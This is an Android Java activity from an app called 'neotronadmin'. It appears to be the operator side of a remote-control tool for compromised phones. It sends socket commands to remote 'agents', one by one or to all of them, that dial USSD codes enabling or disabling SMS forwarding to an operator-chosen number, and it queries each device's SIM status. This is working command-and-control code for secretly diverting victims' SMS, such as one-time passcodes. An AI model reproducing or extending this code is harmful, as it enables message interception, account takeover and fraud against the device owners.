package com.pegalite.neotronadmin.ui.actions;

import static android.view.View.GONE;
import static android.view.View.VISIBLE;

import android.os.Bundle;

import com.pegalite.alerts.dialog.PegaSuccessDialog;
import com.pegalite.alerts.utils.DialogData;
import com.pegalite.neotronadmin.R;
import com.pegalite.neotronadmin.databinding.ActivitySmsForwardingBinding;
import com.pegalite.neotronadmin.functions.alerts.SendingDialog;
import com.pegalite.neotronadmin.functions.helpers.Prefs;
import com.pegalite.neotronadmin.functions.server.socket.PegaSocketServer;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONObject;

import java.util.Objects;

import io.socket.client.Ack;

public class SmsForwardingActivity extends PegaAppCompatActivity {

    ActivitySmsForwardingBinding binding;

    String smsUSSD = "*987*number#", socketEvent = "run-ussd";

    Prefs prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySmsForwardingBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        String agentID = getIntent().getStringExtra("agentID");
        if (agentID == null) {
            return;
        }

        prefs = new Prefs(this);

        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.send.setOnClickListener(v -> {
            String number = binding.number.getText().toString();

            if (number.isBlank()) {
                if (smsUSSD.startsWith("*987*")) {
                    sendUSSD(agentID, "*678#");
                } else {
                    sendUSSD(agentID, "*321#");
                }
                return;
            }

            sendUSSD(agentID, smsUSSD.replace("number", number));

        });


        binding.smsStatus.setOnCheckedChangeListener((group, checkedId) -> {
            if (checkedId == R.id.offline) {
                smsUSSD = "*987*number#";
                loadSimStatus(agentID, "Offline");
            } else {
                smsUSSD = "*432*number#";
                loadSimStatus(agentID, "Online");

            }
        });

        if (!agentID.equals("all")) {
            if (prefs.getPref("last-checked-" + agentID).equals("Online")) {
                binding.smsStatus.check(R.id.online);
            } else {
                binding.smsStatus.check(R.id.offline);
            }

        }

        loadSimStatus(agentID, prefs.getPref("last-checked-" + agentID));

    }

    private void loadSimStatus(String agentID, String status) {
        if (agentID.equals("all")) {
            socketEvent = "all-run-ussd";
            binding.detailsContainer.setVisibility(VISIBLE);
            binding.progress.setVisibility(GONE);
            return;
        }

        binding.progress.setVisibility(VISIBLE);
        binding.detailsContainer.setVisibility(GONE);
        binding.number.setText("");
        PegaSocketServer.getSocket().emit("get_sim_status", agentID, (Ack) args -> {
            runOnUiThread(() -> {
                JSONObject data = (JSONObject) args[0];
                binding.progress.setVisibility(GONE);
                if (data.optString("status").equals("success")) {
                    binding.detailsContainer.setVisibility(VISIBLE);
                    String dataName = status.equals("Online") ? "sms-forward-online" : "sms-forward";
                    String number = Objects.requireNonNull(data.optJSONObject("configs")).optString(dataName, "no-data");
                    if (!number.equals(Prefs.NO_DATA)) {
                        binding.number.setText(number);
                    }
                } else {
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });
    }

    private void sendUSSD(String agentID, String ussd) {
        String type;
        if (ussd.startsWith("*432*") || ussd.startsWith("*321#")) {
            type = "Online";
            prefs.setPref("last-checked-" + agentID, type);
        } else {
            type = "Offline";
            prefs.setPref("last-checked-" + agentID, type);
        }

        SendingDialog sendingDialog = new SendingDialog(getActivity(), DialogData.UN_CANCELABLE);
        sendingDialog.show((ussd.equals("*678#") || ussd.equals("*321#")) ? "Disabling " + type + " SMS Forwarding..." : "Adding Number...");
        addDialogToDestroyList(sendingDialog);
        PegaSocketServer.getSocket().emit(socketEvent, agentID.equals("all") ? getPackageName() : agentID, ussd, 0, (Ack) args -> {
            runOnUiThread(() -> {
                sendingDialog.dismiss();
                JSONObject data = (JSONObject) args[0];
                if (data.optString("status").equals("success")) {
                    PegaSuccessDialog successDialog = new PegaSuccessDialog(getActivity(), DialogData.DISMISS_ON_CANCEL);
                    successDialog.show(type + " SMS Forwarding " + ((ussd.equals("*678#") || ussd.equals("*321#")) ? "Disabled" : "Enabled"));
                    ;
                    addDialogToDestroyList(sendingDialog);
                } else {
                    binding.detailsContainer.setVisibility(GONE);
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });

    }
}